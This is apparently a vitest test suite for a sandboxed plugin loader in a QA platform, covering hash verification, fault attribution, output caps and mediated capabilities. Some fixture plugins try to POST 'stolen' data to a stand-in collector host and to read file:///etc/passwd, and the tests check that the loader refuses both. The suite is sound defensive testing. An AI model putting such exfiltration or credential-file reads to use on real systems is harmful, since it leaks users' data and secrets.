/**
 * Loading somebody else's plugin, and refusing to.
 *
 * Two properties are worth more than the rest of this file put together, so
 * they get the hardest tests:
 *
 *   1. NOTHING RUNS UNTIL THE HASH MATCHES. The registry's content hash is a
 *      decoration unless the runtime checks it before executing, so the
 *      tampered-code test uses code that throws at module scope: if the loader
 *      ever executed first, the fault would come back LOAD_ERROR instead of
 *      HASH_MISMATCH and the test would fail. Asserting only "ok === false"
 *      would have passed either way, which is the trap.
 *
 *   2. A BROKEN PLUGIN IS NEVER THE CUSTOMER'S BROKEN APPLICATION. Every fault
 *      must come back SKIPPED, never FAILED, and must say so in words. A run
 *      that reports "your checkout is broken" because a plugin threw is the
 *      worst bug this feature can ship, and the worker records any throw out of
 *      execute() as exactly that (apps/worker/src/processors/run.ts), so
 *      "execute never rejects" is tested rather than assumed.
 *
 * The plugins here are real ESM source strings run in a real worker, and the
 * hashes are computed with the shipped function. There is no mocked sandbox:
 * a fake one would agree with whatever this file expected.
 */

import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import type { ExecutableTest, RunContext } from '@qaai/shared';
import {
  loadExternalPlugin,
  parsePluginReport,
  pluginContentHash,
  pluginFaultExecution,
  verifyContentHash,
} from './external-loader.js';
import type { InstalledPlugin } from './external-loader.js';
import { DEFAULT_SANDBOX_LIMITS } from './sandbox.js';
import type { SandboxLimits } from './sandbox.js';
import {
  PLUGIN_MANIFEST_SCHEMA,
  PLUGIN_PROTOCOL_VERSION,
  bundleDigest,
  evaluateInstall,
} from '../../../shared/src/plugin-manifest.js';

let server: Server;
let baseUrl: string;

beforeAll(async () => {
  server = createServer((req, res) => {
    res.writeHead(req.url === '/missing' ? 404 : 200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ path: req.url, method: req.method }));
  });
  await new Promise<void>((ready) => server.listen(0, '127.0.0.1', ready));
  baseUrl = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
});

afterAll(async () => {
  await new Promise<void>((closed) => server.close(() => closed()));
});

// ─── Fixtures ────────────────────────────────────────────────────────────────

function installed(code: string, over: Partial<InstalledPlugin> = {}): InstalledPlugin {
  return {
    id: 'plg_1',
    name: 'acme-lighthouse',
    version: '2.1.0',
    testType: 'PERFORMANCE',
    code,
    contentHash: pluginContentHash(code),
    capabilities: [],
    ...over,
  };
}

function context(over: Partial<RunContext> = {}): RunContext {
  return {
    runId: 'run_1',
    orgId: 'org_1',
    projectId: 'proj_1',
    environmentId: 'env_1',
    baseUrl,
    secrets: {},
    fixtures: {},
    grid: null,
    visualBaseline: null,
    storageState: null,
    artifacts: {
      put: async () => '',
      putFile: async () => '',
      get: async () => null,
      putPersistent: async () => '',
    },
    logger: {
      debug: () => {},
      info: () => {},
      warn: () => {},
      error: () => {},
      step: () => {},
    },
    signal: new AbortController().signal,
    determinism: {
      freezeClockAt: null,
      randomSeed: 1,
      waitForNetworkIdle: false,
      retryOnce: false,
    },
    ...over,
  };
}

const test: ExecutableTest = {
  id: 'test_1',
  name: 'home page budget',
  type: 'PERFORMANCE',
  code: '',
  filePath: 'plugins/lighthouse.json',
  spec: { url: '/' },
  timeoutMs: 30_000,
  quarantined: false,
  tags: [],
};

const FAST_LIMITS: SandboxLimits = { ...DEFAULT_SANDBOX_LIMITS, wallClockMs: 8_000 };

/** Loads and executes, failing the test loudly if the load itself was refused. */
async function execute(
  record: InstalledPlugin,
  ctx: RunContext = context(),
  limits: SandboxLimits = FAST_LIMITS,
) {
  const loaded = loadExternalPlugin(record, limits);
  if (!loaded.ok) throw new Error(`load refused: ${loaded.fault.kind} — ${loaded.fault.message}`);
  loaded.plugin.validate(test);
  return await loaded.plugin.execute(ctx, test);
}

const OK_REPORT = `{ status: 'PASSED', steps: [{ title: 'measured LCP', status: 'PASSED' }], findings: [] }`;

// ─── Content hash ────────────────────────────────────────────────────────────

// ─── One hash, not two ───────────────────────────────────────────────────────

describe('the loader and the registry mean the same digest', () => {
  /*
   * There used to be two definitions of "the content hash" and they were over
   * different things: the registry's `code.sha256` is a SHA-256 over the bundle
   * bytes, computed by `bundleDigest`, signed by the publisher and refused at
   * install when it disagrees; this file's was a SHA-256 over the entry file's
   * source as a UTF-8 string, computed by nobody at install time.
   *
   * The registry's won, on provenance — see `pluginContentHash`. These tests
   * pin the consequences of that choice, because both values are a SHA-256 and
   * would coincide for any input either could handle: what changed is which
   * bytes and which function, and neither is visible in a digest.
   */
  const bundle = Buffer.from('export const execute = async () => ({});', 'utf8');

  it('produces exactly the digest the manifest carries', () => {
    expect(pluginContentHash(bundle)).toBe(`sha256:${bundleDigest(bundle)}`);
  });

  it('verifies against the bare hex an install stored, unprefixed', () => {
    // `Plugin.codeSha256` is the manifest's `code.sha256`: 64 lowercase hex
    // characters and no scheme. If the runtime could only accept its own
    // prefixed form, the verification would refuse every real install.
    const stored = bundleDigest(bundle);
    expect(stored).toMatch(/^[0-9a-f]{64}$/);
    expect(verifyContentHash(bundle, stored)).toBeNull();
  });

  it('accepts the digest evaluateInstall refuses installs on', () => {
    // The end-to-end statement of the contract: the value the API demands the
    // bundle hash to is the value the runtime will verify it against. A change
    // to either side's domain — hashing the entry file, hashing a re-encoding,
    // adding a prefix — breaks this and nothing else in the repo.
    const verdict = evaluateInstall({
      manifest: {
        schema: PLUGIN_MANIFEST_SCHEMA,
        name: 'acme-lighthouse',
        version: '1.4.2',
        publisher: 'acme',
        displayName: 'Acme Lighthouse',
        description: 'Measures the pages the suite visits.',
        protocol: PLUGIN_PROTOCOL_VERSION,
        capabilities: ['http'],
        code: { sha256: bundleDigest(bundle), bytes: bundle.length, entry: 'dist/index.js' },
      },
      signature: { algorithm: 'ed25519', value: 'unchecked' },
      bundleSha256: bundleDigest(bundle),
      // No trusted publisher, so the verdict is UNKNOWN_PUBLISHER — which is
      // the point: the digest comparison sits BEHIND the signature check, so
      // reaching a hash refusal at all would mean the order had been reversed.
      publisher: null,
      plan: { label: 'Business', allowsGovernedCapabilities: true },
    });
    expect(verdict.ok).toBe(false);
    if (verdict.ok) throw new Error('unreachable');
    expect(verdict.code).toBe('UNKNOWN_PUBLISHER');
    expect(verifyContentHash(bundle, bundleDigest(bundle))).toBeNull();
  });

  it('hashes bytes, so a bundle and its source string agree', () => {
    expect(pluginContentHash(bundle)).toBe(pluginContentHash(bundle.toString('utf8')));
  });
});

describe('the content hash is checked before anything executes', () => {
  it('accepts code that hashes to what the registry recorded', () => {
    const code = 'export const execute = async () => ({});';
    expect(verifyContentHash(code, pluginContentHash(code))).toBeNull();
  });

  it('accepts a bare hex digest, since the registry may store it either way', () => {
    const code = 'export const execute = async () => ({});';
    const bare = pluginContentHash(code).slice('sha256:'.length);
    expect(verifyContentHash(code, bare.toUpperCase())).toBeNull();
  });

  it('refuses tampered code WITHOUT executing it', () => {
    // The code throws at import. A loader that ran first and hashed second
    // would report LOAD_ERROR here, so the specific kind is the assertion.
    const record = installed('throw new Error("side effect"); export const execute = () => {};', {
      contentHash: pluginContentHash('export const execute = async () => ({});'),
    });
    const loaded = loadExternalPlugin(record);
    expect(loaded.ok).toBe(false);
    if (loaded.ok) throw new Error('unreachable');
    expect(loaded.fault.kind).toBe('HASH_MISMATCH');
    expect(loaded.fault.message).toContain('Nothing was executed');
  });

  it('refuses a hash that is not a sha256 digest at all', () => {
    // An empty or truncated hash must not be treated as "no hash recorded, so
    // allow" — that is the fail-open every verification step grows eventually.
    for (const bogus of ['', 'sha256:', 'not-a-hash', 'md5:abc', 'sha256:beef']) {
      const loaded = loadExternalPlugin(installed('export const execute = async () => ({});', { contentHash: bogus }));
      expect(loaded.ok, bogus).toBe(false);
    }
  });

  it('re-checks at execute time, not only at load', async () => {
    // A loaded plugin outlives one test, and a long-lived worker outlives a
    // reinstall. Mutating the record after a successful load stands in for that.
    const record = installed(`export const execute = async () => (${OK_REPORT});`);
    const loaded = loadExternalPlugin(record, FAST_LIMITS);
    if (!loaded.ok) throw new Error('load should have succeeded');
    record.code = 'export const execute = async () => ({ status: "PASSED", steps: [], findings: [] });';

    const execution = await loaded.plugin.execute(context(), test);
    expect(execution.status).toBe('SKIPPED');
    expect(execution.errorMessage).toContain('does not match the hash recorded at install');
  });
});

// ─── Load-time refusals ──────────────────────────────────────────────────────

describe('load-time refusals', () => {
  it('refuses a capability QAAI cannot enforce, and names the reason', () => {
    const loaded = loadExternalPlugin(
      installed('export const execute = async () => ({});', { capabilities: ['log', 'filesystem'] }),
    );
    expect(loaded.ok).toBe(false);
    if (loaded.ok) throw new Error('unreachable');
    expect(loaded.fault.kind).toBe('REFUSED_CAPABILITY');
    expect(loaded.fault.message).toContain('filesystem');
    expect(loaded.fault.message).toContain('fixtures');
  });

  it('refuses a capability it has never heard of', () => {
    const loaded = loadExternalPlugin(
      installed('export const execute = async () => ({});', { capabilities: ['telemetry'] }),
    );
    expect(loaded.ok).toBe(false);
    if (loaded.ok) throw new Error('unreachable');
    expect(loaded.fault.kind).toBe('REFUSED_CAPABILITY');
  });

  it('refuses a test type QAAI does not have', () => {
    const loaded = loadExternalPlugin(
      installed('export const execute = async () => ({});', { testType: 'CHAOS' }),
    );
    expect(loaded.ok).toBe(false);
    if (loaded.ok) throw new Error('unreachable');
    expect(loaded.fault.kind).toBe('LOAD_ERROR');
  });

  it('refuses code larger than a source file plausibly is', () => {
    const code = `export const execute = async () => ({}); // ${'p'.repeat(3 * 1024 * 1024)}`;
    const loaded = loadExternalPlugin(installed(code));
    expect(loaded.ok).toBe(false);
    if (loaded.ok) throw new Error('unreachable');
    expect(loaded.fault.kind).toBe('CODE_TOO_LARGE');
  });

  it('clamps the limits the manifest asks for', () => {
    const loaded = loadExternalPlugin(
      installed('export const execute = async () => ({});', {
        limits: { wallClockMs: 60 * 60 * 1000, maxFindings: 1_000_000 },
      }),
      { ...DEFAULT_SANDBOX_LIMITS, wallClockMs: 30_000, maxFindings: 100 },
    );
    if (!loaded.ok) throw new Error('load should have succeeded');
    expect(loaded.limits.wallClockMs).toBe(30_000);
    expect(loaded.limits.maxFindings).toBe(100);
  });

  it('produces a RunnerPlugin whose type is the declared test type', () => {
    const loaded = loadExternalPlugin(installed('export const execute = async () => ({});'));
    if (!loaded.ok) throw new Error('load should have succeeded');
    expect(loaded.plugin.type).toBe('PERFORMANCE');
    // validate() must never throw: the worker records a throw here as the
    // customer's application failing.
    expect(() => loaded.plugin.validate({ ...test, spec: { total: 'nonsense' } })).not.toThrow();
  });
});

// ─── Attribution ─────────────────────────────────────────────────────────────

describe('a broken plugin is never a broken application', () => {
  it.each([
    ['throws', `export const execute = async () => { throw new Error('plugin bug'); };`],
    ['fails to load', 'export const execute = async () => {'],
    ['exports nothing usable', 'export const somethingElse = 1;'],
    ['returns the wrong shape', 'export const execute = async () => ({ result: "fine" });'],
    ['returns nothing at all', 'export const execute = async () => undefined;'],
  ])('records SKIPPED, not FAILED, when a plugin %s', async (_label, code) => {
    const execution = await execute(installed(code));
    expect(execution.status).toBe('SKIPPED');
    expect(execution.errorMessage).toContain('not a failure of the application under test');
    expect(execution.errorMessage).toContain('acme-lighthouse@2.1.0');
  });

  it('never rejects out of execute(), whatever the plugin does', async () => {
    // The worker's try/catch turns a rejection into FAILED with the thrown
    // message, so a rejection here is the mis-attribution arriving by a side
    // door. Resolving is the assertion.
    const loaded = loadExternalPlugin(
      installed(`export const execute = async () => { throw new Error('nope'); };`),
      FAST_LIMITS,
    );
    if (!loaded.ok) throw new Error('load should have succeeded');
    await expect(loaded.plugin.execute(context(), test)).resolves.toMatchObject({
      status: 'SKIPPED',
    });
  });

  it('records SKIPPED when the plugin hangs, and does not hang the run', async () => {
    const started = Date.now();
    const execution = await execute(
      installed('export const execute = async () => new Promise(() => {});'),
      context(),
      { ...FAST_LIMITS, wallClockMs: 400 },
    );
    expect(execution.status).toBe('SKIPPED');
    expect(execution.errorMessage).toContain('did not finish within 400ms');
    expect(Date.now() - started).toBeLessThan(5_000);
  });

  it('gives the cockpit a step to render rather than an empty test', () => {
    const execution = pluginFaultExecution(
      'test_9',
      { name: 'p', version: '1.0.0' },
      { kind: 'THREW', message: 'kaboom' },
    );
    expect(execution.steps).toHaveLength(1);
    expect(execution.steps[0]?.title).toBe('Plugin p@1.0.0 (THREW)');
    expect(execution.steps[0]?.status).toBe('SKIPPED');
  });

  it('does not blame the plugin for a cancelled run', () => {
    const execution = pluginFaultExecution(
      'test_9',
      { name: 'p', version: '1.0.0' },
      { kind: 'CANCELLED', message: 'the run was cancelled' },
    );
    expect(execution.errorMessage).toContain('cancelled');
    expect(execution.errorMessage).not.toContain('fault in the plugin');
  });
});

// ─── Emission caps ───────────────────────────────────────────────────────────

describe('a plugin cannot fill the database', () => {
  it('refuses a report with more findings than the cap', async () => {
    const execution = await execute(
      installed(`export const execute = async () => ({
         status: 'FAILED',
         steps: [],
         findings: Array.from({ length: 400 }, (_, i) => ({
           kind: 'SECURITY', severity: 'MINOR', code: 'c' + i, message: 'm', location: '/',
         })),
       });`),
      context(),
      { ...FAST_LIMITS, maxFindings: 50 },
    );
    expect(execution.status).toBe('SKIPPED');
    expect(execution.errorMessage).toContain('400 findings');
    expect(execution.findings).toHaveLength(0);
  });

  it('refuses a report with more steps than the cap', () => {
    const json = JSON.stringify({
      status: 'PASSED',
      steps: Array.from({ length: 200 }, (_, i) => ({ title: `s${i}`, status: 'PASSED' })),
      findings: [],
    });
    const parsed = parsePluginReport(json, { ...DEFAULT_SANDBOX_LIMITS, maxSteps: 100 });
    expect(parsed.ok).toBe(false);
    if (parsed.ok) throw new Error('unreachable');
    expect(parsed.fault.kind).toBe('TOO_MANY_EMITTED');
  });

  it('caps on length before it walks the elements', () => {
    // A million findings must be refused by a length comparison, not after a
    // validator has visited a million objects. If this ever regresses to a
    // per-element walk the test does not fail — it takes minutes — so the
    // budget is the assertion.
    const json = JSON.stringify({
      status: 'PASSED',
      steps: [],
      findings: Array.from({ length: 200_000 }, () => ({
        kind: 'SECURITY', severity: 'MINOR', code: 'c', message: 'm', location: '/',
      })),
    });
    const started = Date.now();
    const parsed = parsePluginReport(json, { ...DEFAULT_SANDBOX_LIMITS, maxFindings: 500 });
    expect(parsed.ok).toBe(false);
    expect(Date.now() - started).toBeLessThan(1_000);
  });

  it.each([['not json', '{ nope'], ['not an object', '"hello"'], ['null', 'null']])(
    'refuses a report that is %s',
    (_label, json) => {
      const parsed = parsePluginReport(json, DEFAULT_SANDBOX_LIMITS);
      expect(parsed.ok).toBe(false);
      if (parsed.ok) throw new Error('unreachable');
      expect(parsed.fault.kind).toBe('BAD_SHAPE');
    },
  );

  it('narrows the verdicts a plugin may award itself', () => {
    // FLAKY is the platform's judgement across runs; TIMED_OUT is the
    // sandbox's. A plugin claiming either would be claiming a fact it is not
    // in a position to know.
    for (const status of ['FLAKY', 'TIMED_OUT', 'ERRORED', 'passed']) {
      const parsed = parsePluginReport(JSON.stringify({ status, steps: [], findings: [] }), DEFAULT_SANDBOX_LIMITS);
      expect(parsed.ok, status).toBe(false);
    }
  });
});

// ─── Mediated capabilities ───────────────────────────────────────────────────

describe('mediated capabilities', () => {
  it('carries a plugin verdict and its steps through to the result', async () => {
    const execution = await execute(installed(`export const execute = async () => (${OK_REPORT});`));
    expect(execution.status).toBe('PASSED');
    expect(execution.steps).toHaveLength(1);
    expect(execution.steps[0]).toMatchObject({ index: 0, title: 'measured LCP', status: 'PASSED' });
    expect(execution.steps[0]?.startedAt).toMatch(/^\d{4}-\d{2}-\d{2}T/);
  });

  it('still reports a genuine application failure as FAILED', async () => {
    // The counter-test to every SKIPPED above. If plugin faults are attributed
    // so eagerly that a plugin's real verdict stops arriving, the attribution
    // rule has become a way to hide bugs.
    const execution = await execute(
      installed(`export const execute = async () => ({
         status: 'FAILED',
         errorMessage: 'LCP was 4.1s against a 2.5s budget',
         steps: [{ title: 'largest contentful paint', status: 'FAILED',
                   error: { message: 'over budget', expected: '2500', actual: '4100' } }],
         findings: [{ kind: 'PERFORMANCE', severity: 'SERIOUS', code: 'lcp', message: 'slow', location: '/' }],
       });`),
    );
    expect(execution.status).toBe('FAILED');
    expect(execution.errorMessage).toBe('LCP was 4.1s against a 2.5s budget');
    expect(execution.steps[0]?.error).toMatchObject({ expected: '2500', actual: '4100' });
    expect(execution.findings).toHaveLength(1);
  });

  it('hands over only the secrets the manifest declared', async () => {
    const execution = await execute(
      installed(
        `export const execute = async (api) => {
           const allowed = await api.secrets.get('LIGHTHOUSE_TOKEN');
           let refused = null;
           try { await api.secrets.get('DATABASE_URL'); } catch (err) { refused = err.message; }
           return { status: allowed === 'tok-abcdef' && refused ? 'PASSED' : 'FAILED', steps: [], findings: [] };
         };`,
        { capabilities: ['secrets'], secretNames: ['LIGHTHOUSE_TOKEN'] },
      ),
      context({ secrets: { LIGHTHOUSE_TOKEN: 'tok-abcdef', DATABASE_URL: 'postgres://hunter2@db/app' } }),
    );
    expect(execution.status).toBe('PASSED');
    const transcript = execution.console.map((entry) => entry.text).join('\n');
    expect(transcript).toContain('refused');
    expect(transcript).toContain('DATABASE_URL');
    expect(transcript).not.toContain('postgres://');
  });

  it('masks a secret the plugin echoes back into its report', async () => {
    // A plugin granted a secret holds it, and nothing in-process stops it
    // putting the value in a step title. Masking on the way out keeps it from
    // reaching the database, the SSE stream and the triage prompt.
    const execution = await execute(
      installed(
        `export const execute = async (api) => {
           const token = await api.secrets.get('LIGHTHOUSE_TOKEN');
           return { status: 'FAILED', errorMessage: 'auth failed with ' + token,
                    steps: [{ title: 'used ' + token, status: 'FAILED' }], findings: [] };
         };`,
        { capabilities: ['secrets'], secretNames: ['LIGHTHOUSE_TOKEN'] },
      ),
      context({ secrets: { LIGHTHOUSE_TOKEN: 'sk-live-4f2b9c1e' } }),
    );
    expect(execution.errorMessage).not.toContain('sk-live-4f2b9c1e');
    expect(execution.steps[0]?.title).not.toContain('sk-live-4f2b9c1e');
    expect(execution.steps[0]?.title).toContain('used ');
  });

  it('hands over only the fixtures the manifest declared', async () => {
    const execution = await execute(
      installed(
        `export const execute = async (api) => {
           const ok = await api.fixtures.read('fixtures/users.json');
           let refused = false;
           try { await api.fixtures.read('fixtures/secrets.json'); } catch { refused = true; }
           return { status: ok === '[]' && refused ? 'PASSED' : 'FAILED', steps: [], findings: [] };
         };`,
        { capabilities: ['fixtures'], fixturePaths: ['fixtures/users.json'] },
      ),
      context({ fixtures: { 'fixtures/users.json': '[]', 'fixtures/secrets.json': 'nope' } }),
    );
    expect(execution.status).toBe('PASSED');
  });

  it('makes http requests for the plugin and records them as network entries', async () => {
    const execution = await execute(
      installed(
        `export const execute = async (api) => {
           const res = await api.http.request({ url: '/ping' });
           return { status: res.status === 200 ? 'PASSED' : 'FAILED', steps: [], findings: [] };
         };`,
        { capabilities: ['http'] },
      ),
    );
    expect(execution.status).toBe('PASSED');
    expect(execution.network).toHaveLength(1);
    expect(execution.network[0]).toMatchObject({ method: 'GET', status: 200 });
    expect(execution.network[0]?.url).toContain('/ping');
  });

  it('refuses an origin that is neither the environment nor a declared one', async () => {
    // The exfiltration path a mediated fetch would otherwise open: the plugin
    // has the response body and wants to POST it somewhere it chose.
    const execution = await execute(
      installed(
        `export const execute = async (api) => {
           let refused = null;
           try { await api.http.request({ url: 'https://collector.example.com/x', method: 'POST', body: 'stolen' }); }
           catch (err) { refused = err.message; }
           return { status: 'PASSED', steps: [], findings: [],
                    errorMessage: refused };
         };`,
        { capabilities: ['http'] },
      ),
    );
    expect(execution.errorMessage).toContain('collector.example.com');
    expect(execution.network).toHaveLength(0);
  });

  it('refuses a non-http scheme', async () => {
    const execution = await execute(
      installed(
        `export const execute = async (api) => {
           let refused = null;
           try { await api.http.request({ url: 'file:///etc/passwd' }); } catch (err) { refused = err.message; }
           return { status: 'PASSED', steps: [], findings: [], errorMessage: refused };
         };`,
        { capabilities: ['http'] },
      ),
    );
    expect(execution.errorMessage).toContain('"file:" is not an allowed scheme');
  });

  it('writes mediated log lines into the transcript', async () => {
    const execution = await execute(
      installed(
        `export const execute = async (api) => { await api.log.line('lcp 1.2s'); return ${OK_REPORT}; };`,
        { capabilities: ['log'] },
      ),
    );
    expect(execution.console.map((entry) => entry.text)).toContain('lcp 1.2s');
  });

  it('does not give a plugin a capability its manifest omitted', async () => {
    // The api object simply has no `secrets`, so this is a TypeError inside the
    // plugin — attributed to the plugin, as it should be.
    const execution = await execute(
      installed(`export const execute = async (api) => { await api.secrets.get('X'); };`, {
        capabilities: ['log'],
      }),
    );
    expect(execution.status).toBe('SKIPPED');
    expect(execution.steps[0]?.title).toContain('(THREW)');
  });

  it('records the containment tier it actually ran under', async () => {
    // The vitest process is not started under `--permission`, so this is the
    // honest tier: an isolate, with the filesystem and raw sockets not covered.
    const execution = await execute(installed(`export const execute = async () => (${OK_REPORT});`));
    const transcript = execution.console.map((entry) => entry.text).join('\n');
    expect(transcript).toContain('isolate-level containment');
    expect(transcript).toContain('filesystem and raw sockets are not');
  });
});
